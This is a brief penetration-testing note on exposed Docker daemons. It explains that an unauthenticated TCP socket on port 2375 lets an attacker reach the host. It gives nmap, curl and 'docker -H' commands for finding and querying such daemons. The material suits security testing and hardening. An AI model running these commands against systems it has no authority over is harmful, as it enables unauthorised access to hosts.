# Misconfigurations

The Docker daemon can listen for Docker Engine API requests via three different types of Socket `unix`, `tcp`, and `fd`. To access remotely an attacker would have to enable `tcp` socket. The default setup provides un-encrypted and un-authenticated direct access to the Docker daemon. It is conventional to use port `2375` for un-encrypted, and port `2376` for encrypted communication with the daemon.

Scan the `2375` and `2376` port using `nmap`

```text
nmap -p 2375,2376 -n x.x.x.x -v
```

And query the docker api: 

```text
curl x.x.x.x:2375/images/json | jq .
```

The attacker can now abuse this by using the docker daemon configuration to access the host system's docker runtime, giving the attacker access to the host system.

```text
docker -H tcp://IP:2375 ps
docker -H tcp://IP:2375 images
```